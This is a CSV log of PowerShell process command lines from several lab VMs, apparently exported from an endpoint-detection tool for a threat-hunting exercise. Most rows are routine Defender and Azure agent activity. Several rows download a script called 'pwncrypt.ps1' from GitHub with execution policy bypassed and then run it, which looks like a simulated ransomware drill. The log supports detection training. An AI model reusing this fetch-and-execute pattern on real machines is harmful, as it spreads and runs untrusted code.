Timestamp,DeviceName,ProcessCommandLine
1/16/2026 18:23,mm-atomicred-vm,"powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {if ($ExecutionContext.SessionState.LanguageMode -eq 'FullLanguage') {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8}else {chcp 65001}; &  'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8809.14538576.0.14538576-8d2440cf6f4650cd003cf316c643778c9b43bd76\cfa5b5b7-e717-474f-ad6a-a99ebd513b5c.ps1' }"""
1/16/2026 18:22,jinks-server-fi,"powershell  -NoProfile -Command ""& {$j = sajb {$ErrorActionPreference = 'SilentlyContinue';$fileInclude = '.*\\ISL Light Client\.exe$'; $pathExclude = '\\MicrosoftEdge\\Cache\\|\\Windows\\Temporary\.Internet\.Files\\|\\Windows\\INetCache\\|\\Chrome\\User\.Data\\Default\\Cache\\|\\Users\\.*\\AppData\\Local\\Packages\\Microsoft\.AAD\.BrokerPlugin_cw5n1h2txyewy\\AC\\TokenBroker\\Accounts|\\Users\\.*\\AppData\\Local\\ConnectedDevicesPlatform|\\Users\\.*\\AppData\\Local\\Microsoft\\TokenBroker\\Cache|\\Windows\\SystemApps\\Microsoft\.AAD\.BrokerPlugin_cw5n1h2txyewy|\\Windows\\WinSxS\\|\\Windows\\servicing\\|\\\$Recycle\.Bin.*'; $pathInclude = ('C:\'); function CustomSeek( [System.IO.FileSystemInfo] $Item ) { if ( ! ($Item.Attributes -band [IO.FileAttributes]::ReparsePoint) ) { if ( $Item.GetType() -eq [System.IO.DirectoryInfo] ) { foreach ($ChildItem in gci -Path $Item.FullName -Force ) { if ( $pathExclude -eq '' -or $ChildItem.FullName -notmatch $pathExclude ) { CustomSeek $ChildItem; } } } else { if ( $Item.FullName -match $fileInclude -and $Item.FullName -notmatch $pathExclude ) { $Item; } } } } CustomSeek( Get-Item $pathInclude -Force ) | % {$_.FullName} | Write-Host};$r = wjb $j -Timeout 1800; rcjb $j;}""  "
1/16/2026 18:22,jinks-server-fi,"powershell  -NoProfile -Command ""& {$j = sajb {$ErrorActionPreference = 'SilentlyContinue';$fileInclude = '.*\\site-packages\\.*\.egg-info$|.*\\site-packages\\.*\.egg\\EGG-INFO\\PKG-INFO$|.*\\site-packages\\.*\.egg-info\\PKG-INFO$|.*\\site-packages\\.*\.dist-info\\METADATA$'; $pathExclude = '\\MicrosoftEdge\\Cache\\|\\Windows\\Temporary\.Internet\.Files\\|\\Windows\\INetCache\\|\\Chrome\\User\.Data\\Default\\Cache\\|\\Users\\.*\\AppData\\Local\\Packages\\Microsoft\.AAD\.BrokerPlugin_cw5n1h2txyewy\\AC\\TokenBroker\\Accounts|\\Users\\.*\\AppData\\Local\\ConnectedDevicesPlatform|\\Users\\.*\\AppData\\Local\\Microsoft\\TokenBroker\\Cache|\\Windows\\SystemApps\\Microsoft\.AAD\.BrokerPlugin_cw5n1h2txyewy|\\Windows\\WinSxS\\|\\Windows\\servicing\\|\\\$Recycle\.Bin.*'; $pathInclude = ('C:\'); function CustomSeek( [System.IO.FileSystemInfo] $Item ) { if ( ! ($Item.Attributes -band [IO.FileAttributes]::ReparsePoint) ) { if ( $Item.GetType() -eq [System.IO.DirectoryInfo] ) { foreach ($ChildItem in gci -Path $Item.FullName -Force ) { if ( $pathExclude -eq '' -or $ChildItem.FullName -notmatch $pathExclude ) { CustomSeek $ChildItem; } } } else { if ( $Item.FullName -match $fileInclude -and $Item.FullName -notmatch $pathExclude ) { $Item; } } } } CustomSeek( Get-Item $pathInclude -Force ) | % {$_.FullName} | Write-Host};$r = wjb $j -Timeout 1620; rcjb $j;}""  "
1/16/2026 18:21,jinks-server-fi,"powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {if ($ExecutionContext.SessionState.LanguageMode -eq 'FullLanguage') {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8}else {chcp 65001}; &  'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8809.14538576.0.14538576-831abcda016d5e7eebb3455868dc9906f91acf53\969023c4-546f-45ea-8f49-ca6d45ba75f4.ps1' }"""
1/16/2026 18:20,jinks-server-fi,"powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {if ($ExecutionContext.SessionState.LanguageMode -eq 'FullLanguage') {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8}else {chcp 65001}; &  'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8809.14538576.0.14538576-831abcda016d5e7eebb3455868dc9906f91acf53\fc19515e-4fbb-46d1-b1f4-a28b394632fe.ps1' }"""
1/16/2026 18:19,kobe24,"""powershell.exe"" -noninteractive -outputFormat xml -NonInteractive -encodedCommand IABbAEUAbgB2AGkAcgBvAG4AbQBlAG4AdABdADoAOgBPAFMAVgBlAHIAcwBpAG8AbgAuAFYAZQByAHMAaQBvAG4AIAA= -inputFormat xml"
1/16/2026 18:17,kobe24,"""powershell.exe"" -noninteractive -outputFormat xml -NonInteractive -encodedCommand IABbAEUAbgB2AGkAcgBvAG4AbQBlAG4AdABdADoAOgBPAFMAVgBlAHIAcwBpAG8AbgAuAFYAZQByAHMAaQBvAG4AIAA= -inputFormat xml"
1/16/2026 18:14,final-lab-vm-ad,"powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {if ($ExecutionContext.SessionState.LanguageMode -eq 'FullLanguage') {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8}else {chcp 65001}; &  'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8809.14538576.0.14538576-831abcda016d5e7eebb3455868dc9906f91acf53\149ae17f-1c51-47e8-90b8-8175a782d62b.ps1' }"""
1/16/2026 18:13,kjvm1,"powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {if ($ExecutionContext.SessionState.LanguageMode -eq 'FullLanguage') {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8}else {chcp 65001}; &  'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8809.14538576.0.14538576-8d2440cf6f4650cd003cf316c643778c9b43bd76\53159fd8-6386-48c2-91e8-cf4860599c43.ps1' }"""
1/16/2026 18:13,jinks-server-fi,"powershell.exe  ""& {$webClient = New-Object System.Net.WebClient; $webClient.Headers.add(\""Metadata\"", \""true\""); $webClient.DownloadString(\""http://168.63.129.16/metadata/instance/compute?api-version=2017-12-01\"")};""  "
1/16/2026 18:13,jinks-server-fi,"powershell.exe  ""& {$webClient = New-Object System.Net.WebClient; $webClient.DownloadString(\""http://168.63.129.16/metadata/latest/InstanceInfo\"")};""  "
1/16/2026 18:13,jinks-server-fi,"powershell.exe  ""& {$webClient = New-Object System.Net.WebClient; $webClient.Headers.add(\""x-ms-version\"", \""2015-04-05\""); $webClient.Headers.add(\""x-ms-guest-agent-name\"", \""WaAgent-2.5.0.0 (2.7.0.0)\""); $webClient.DownloadString(\""http://168.63.129.16/machine?comp=goalstate\"")};""  "
1/16/2026 18:13,wvm-edr-target,powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1
1/16/2026 18:13,logn-pacific-dc,powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1
1/16/2026 18:13,logn-pacific-dc,"""powershell.exe"" C:\Packages\Plugins\Microsoft.Azure.AzureDefenderForServers.MDE.Windows\1.0.17.0\MdeExtensionHandler.ps1 "
1/16/2026 18:13,wvm-edr-target,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1
1/16/2026 18:13,wvm-edr-target,powershell  -ExecutionPolicy Unrestricted -File script3.ps1
1/16/2026 18:13,logn-pacific-dc,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1
1/16/2026 18:12,cyberlab,powershell.exe  -NoProfile -NonInteractive -ExecutionPolicy RemoteSigned -File C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.101.0\bin\enable.ps1 -StartAsyncProcess 
1/16/2026 18:12,logn-pacific-dc,powershell  -ExecutionPolicy Unrestricted -File script12.ps1
1/16/2026 18:12,wvm-edr-target,powershell.exe  -NoProfile -NonInteractive -ExecutionPolicy RemoteSigned -File C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.101.0\bin\enable.ps1 -StartAsyncProcess 
1/16/2026 18:12,kobe24,powershell.exe  -NoProfile -NonInteractive -ExecutionPolicy RemoteSigned -File C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.101.0\bin\enable.ps1 -StartAsyncProcess 
1/16/2026 18:12,windows-target-,powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1
1/16/2026 18:12,logn-pacific-dc,Powershell.exe  -NoProfile -NonInteractive -ExecutionPolicy Bypass C:\Packages\Plugins\Microsoft.Azure.AzureDefenderForServers.MDE.Windows\1.0.17.0\\MdeExtensionHandlerWrapper.ps1 -Action enable
1/16/2026 18:12,logn-pacific-dc,powershell.exe  -NoProfile -NonInteractive -ExecutionPolicy RemoteSigned -File C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.101.0\bin\enable.ps1 -StartAsyncProcess 
1/16/2026 18:12,sandboxvm,powershell.exe  -NoProfile -NonInteractive -ExecutionPolicy RemoteSigned -File C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.101.0\bin\enable.ps1 -StartAsyncProcess 
1/16/2026 18:12,winows-btest,powershell.exe  -NoProfile -NonInteractive -ExecutionPolicy RemoteSigned -File C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.101.0\bin\enable.ps1 -StartAsyncProcess 
